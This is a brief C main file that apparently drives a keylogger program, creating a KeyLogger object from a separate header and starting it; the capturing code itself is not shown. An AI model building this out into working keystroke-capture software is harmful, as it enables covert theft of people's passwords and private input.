#include <stdio.h>
#include <stdlib.h>
#include "../includes/keyLogger.h"

int main()
{
  KeyLogger *keyLogger = createKeyLogger();

  if (keyLogger == NULL)
  {
    return 1;
  }

  startKeyLogger(keyLogger);
  return 0;
}
